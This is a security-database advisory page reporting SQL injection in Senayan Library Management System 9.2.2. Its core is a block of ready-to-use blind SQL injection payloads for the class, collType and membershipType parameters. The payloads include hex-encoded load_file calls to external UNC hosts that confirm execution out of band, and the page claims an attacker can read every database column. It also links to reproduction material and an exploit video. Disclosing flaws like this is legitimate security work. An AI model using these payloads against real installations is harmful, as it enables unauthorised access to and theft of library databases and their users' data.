---
title: Senayan Library Management System 9.2.2 SQL Injection
url: https://cxsecurity.com/issue/WLB-2022120049
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-12-29
fetch_date: 2025-10-04T02:38:39.338617
---

# Senayan Library Management System 9.2.2 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Senayan Library Management System 9.2.2 SQL Injection** **2022.12.28**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

## Title: Senayan Library Management System v9.2.2 a.k.a SLIMS 9 Multiple SQLi-Not sanitizing correctly cookie session.
## Author: nu11secur1ty
## Date: 12.20.2022
## Vendor: https://slims.web.id/web/
## Software: https://github.com/slims/slims9\_bulian/releases/tag/v9.2.2
## Reference:
https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/slims.web.id/SLIMS-9.2.2/SQLi
## Description:
The manual insertion `point 3, 4, and 5` appears to be vulnerable to SQL
injection attacks. The payload '+(select load\_file('\\\\
azditm561h7fku3yj99us8ne258zwpkgn4eu1opd.stupid.com\\dzd'))+' was submitted
in the manual insertion `point 3`.
This payload injects a SQL sub-query that calls MySQL's load\_file function
with a UNC file path that references a URL on an external domain.
After manual testing: The parameters class, collType and membershipType are
vulnerable to SQLi attacks!
The application interacted with that domain, indicating that the injected
SQL query was executed.
The attacker can take information from all database columns of this system
by using this vulnerability.
Not sanitizing correctly cookie session.
## STATUS: HIGH Vulnerability
[+] Payload:
```MySQL
00
---
Parameter: class (GET)
Type: boolean-based blind
Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or
GROUP BY clause
Payload: reportView=true&year=2002&class=bbbb'+(select load\_file('\\\\
716gb1cfe9gkja4zdj45qxx9208vwlkcn0en6bv.slims.web.id\\nbq'))+''+(select
load\_file('\\\\1rtb9wq2997df8x4x2cdtmp4kvqoee255twjjb70.slims.web.id\\avg'))+''
RLIKE (SELECT (CASE WHEN (2920=2920) THEN 0x62626262+(select
load\_file(0x5c5c5c5c37313667623163666539676b6a61347a646a34357178783932303876776c6b636e30656e3662762e736c696d732e7765622e69645c5c6e6271))+''+(select
load\_file(0x5c5c5c5c3172746239777132393937646638783478326364746d70346b76716f656532353574776a6a6237302e736c696d732e7765622e69645c5c617667))+''
ELSE 0x28 END)) AND 'xMPZ'='xMPZ&membershipType=a''&collType=aaaa'+(select
load\_file('\\\\dctiy0hziwzd4xujfqqcfd3uul0koac1fp6ft9hy.slims.web.id\\wtf'))+''+(select
load\_file('\\\\azditm561h7fku3yj99us8ne258zwpkgn4eu1opd.slims.web.id
\\dzd'))+'
---
01
---
Parameter: collType (GET)
Type: boolean-based blind
Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or
GROUP BY clause
Payload: reportView=true&year=2002&class=bbbb'+(select load\_file('\\\\
716gb1cfe9gkja4zdj45qxx9208vwlkcn0en6bv.slims.web.id\\nbq'))+''+(select
load\_file('\\\\1rtb9wq2997df8x4x2cdtmp4kvqoee255twjjb70.slims.web.id\\avg'))+'&membershipType=a''&collType=aaaa'+(select
load\_file('\\\\dctiy0hziwzd4xujfqqcfd3uul0koac1fp6ft9hy.slims.web.id\\wtf'))+''+(select
load\_file('\\\\azditm561h7fku3yj99us8ne258zwpkgn4eu1opd.slims.web.id\\dzd'))+''
RLIKE (SELECT (CASE WHEN (2279=2279) THEN 0x61616161+(select
load\_file(0x5c5c5c5c646374697930687a69777a643478756a6671716366643375756c306b6f61633166703666743968792e736c696d732e7765622e69645c5c777466))+''+(select
load\_file(0x5c5c5c5c617a6469746d3536316837666b7533796a39397573386e653235387a77706b676e346575316f70642e736c696d732e7765622e69645c5c647a64))+''
ELSE 0x28 END)) AND 'MGZY'='MGZY
---
03
---
Parameter: membershipType (GET)
Type: boolean-based blind
Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or
GROUP BY clause
Payload: reportView=true&year=2002&class=bbbb'+(select load\_file('\\\\
716gb1cfe9gkja4zdj45qxx9208vwlkcn0en6bv.slims.web.id\\nbq'))+''+(select
load\_file('\\\\1rtb9wq2997df8x4x2cdtmp4kvqoee255twjjb70.slims.web.id\\avg'))+'&membershipType=a'''
RLIKE (SELECT (CASE WHEN (7628=7628) THEN 0x612727 ELSE 0x28 END)) AND
'ckmk'='ckmk&collType=aaaa'+(select load\_file('\\\\
dctiy0hziwzd4xujfqqcfd3uul0koac1fp6ft9hy.slims.web.id\\wtf'))+''+(select
load\_file('\\\\azditm561h7fku3yj99us8ne258zwpkgn4eu1opd.slims.web.id
\\dzd'))+'
---
```
## Reproduce:
[href](
https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/slims.web.id/SLIMS-9.2.2/SQLi
)
## Reference:
[Using HTTP cookies](
https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
## Proof and Exploit:
[href](https://streamable.com/1m0y6c)
## Time spent
`00:35:00`
## Writing an exploit
`00:15:00`

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022120049)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top